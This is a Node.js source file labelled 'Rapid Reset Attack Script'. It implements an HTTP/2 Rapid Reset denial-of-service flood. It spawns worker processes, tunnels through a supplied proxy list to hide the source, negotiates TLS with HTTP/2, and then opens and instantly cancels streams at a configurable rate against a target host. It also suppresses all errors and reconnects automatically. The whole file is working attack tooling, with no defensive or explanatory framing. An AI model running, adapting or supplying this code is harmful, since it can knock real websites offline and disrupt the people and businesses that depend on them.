const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
const colors = require("colors");
const util = require('util');
const v8 = require("v8");

// Configuration
const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;
const RAPID_RESET_INTERVAL = 10; // Milliseconds between rapid resets
const MAX_STREAMS_PER_CONNECTION = 1000; // Max streams to create before resetting

// Process arguments
if (process.argv.length < 7) {
    console.log(`Usage: host time rate threads proxyfile [mode] [ipversion]`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    input: process.argv[7] || "flood",
    ipversion: process.argv[8]
};

// Read proxies
const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const targetURL = parsedTarget.host;

// TLS Configuration
const ciphers = crypto.constants.defaultCoreCipherList;
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION;

if (cluster.isMaster) {
    console.clear();
    console.log(`Rapid Reset Attack Script`);
    console.log(`--------------------------------------------`);
    console.log("Heap Size:", (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString());
    console.log('Target:', args.target);
    console.log('Time:', args.time);
    console.log('Rate:', args.Rate);
    console.log('Threads:', args.threads);
    console.log(`Proxies: ${proxies.length}`);
    console.log('Mode:', args.input);
    console.log(`--------------------------------------------`);

    // Start workers
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    // Restart workers if RAM usage is too high
    setInterval(() => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
            setTimeout(() => {
                for (let i = 0; i < args.threads; i++) {
                    cluster.fork();
                }
            }, RESTART_DELAY);
        }
    }, 5000);
} else {
    // Worker process - start the attack
    startRapidResetAttack();
}

function startRapidResetAttack() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    const parsedProxy = proxyAddr.split(":");
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 30
    };

    // Create TCP connection through proxy
    const connection = net.connect({
        host: proxyOptions.host,
        port: proxyOptions.port
    });

    connection.on('connect', () => {
        // Send CONNECT request to proxy
        connection.write(`CONNECT ${proxyOptions.address} HTTP/1.1\r\nHost: ${proxyOptions.address}\r\n\r\n`);
    });

    connection.on('data', (data) => {
        if (data.toString().includes('200')) {
            // Proxy connection established, create TLS connection
            const tlsOptions = {
                socket: connection,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                ALPNProtocols: ['h2'],
                secureProtocol: 'TLSv1_3_method',
                ciphers: ciphers,
                secureOptions: secureOptions,
                rejectUnauthorized: false
            };

            const tlsConn = tls.connect(tlsOptions);

            tlsConn.on('secureConnect', () => {
                // Create HTTP/2 client
                const client = http2.connect(parsedTarget.href, {
                    createConnection: () => tlsConn,
                    settings: {
                        enablePush: false,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                        maxConcurrentStreams: 10000,
                        maxHeaderListSize: 262144
                    }
                });

                client.on('connect', () => {
                    console.log('HTTP/2 connection established - starting rapid reset attack');

                    let streamCount = 0;
                    const attackInterval = setInterval(() => {
                        // Create multiple streams and immediately reset them
                        for (let i = 0; i < args.Rate; i++) {
                            const req = client.request({
                                ':method': 'GET',
                                ':path': parsedTarget.path || '/',
                                ':authority': parsedTarget.host,
                                ':scheme': 'https',
                                'user-agent': 'Mozilla/5.0',
                                'accept': '*/*'
                            });

                            // Immediately reset the stream (Rapid Reset)
                            req.close(http2.constants.NGHTTP2_CANCEL);
                            streamCount++;

                            // Reset connection after reaching max streams
                            if (streamCount >= MAX_STREAMS_PER_CONNECTION) {
                                client.destroy();
                                clearInterval(attackInterval);
                                startRapidResetAttack(); // Start new connection
                                return;
                            }
                        }
                    }, RAPID_RESET_INTERVAL);
                });

                client.on('error', (err) => {
                    console.log('HTTP/2 error:', err.message);
                    client.destroy();
                    startRapidResetAttack(); // Reconnect
                });
            });

            tlsConn.on('error', (err) => {
                console.log('TLS error:', err.message);
                startRapidResetAttack(); // Reconnect
            });
        }
    });

    connection.on('error', (err) => {
        console.log('Proxy connection error:', err.message);
        startRapidResetAttack(); // Reconnect
    });
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

// Set timeout to stop the attack
setTimeout(() => {
    process.exit();
}, args.time * 1000);

// Error handling
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
